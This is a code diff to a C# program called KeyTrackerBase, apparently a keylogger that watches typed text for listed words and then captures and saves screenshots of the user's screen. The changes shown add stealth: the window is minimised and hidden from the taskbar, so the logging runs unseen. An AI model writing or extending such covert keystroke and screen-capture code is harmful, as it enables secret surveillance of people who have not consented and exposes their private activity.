@@ -29,7 +29,9 @@ namespace KeyTrackerBase
 
         public Form1()
         {
-            
+            //hide form
+            this.WindowState = FormWindowState.Minimized;
+            this.ShowInTaskbar = false;
 
             InitializeComponent();
 
@@ -142,12 +144,11 @@ namespace KeyTrackerBase
                                                     badWords += words[i] + " ";
 
                                                     //capture screenshot
-                                                    ////http://www.mindfiresolutions.com/How-to-take-screenshot-programmatically-and-mail-it-in-C-647.php
+                                                    //http://www.mindfiresolutions.com/How-to-take-screenshot-programmatically-and-mail-it-in-C-647.php
                                                     Bitmap screencapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                                     Graphics graphics = Graphics.FromImage(screencapture as Image);
                                                     graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
                                                     screencapture.Save("C:\\Users\\Jon\\Desktop\\screenshot.jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
-                                                    
                                                 }
                                                 
                                             }
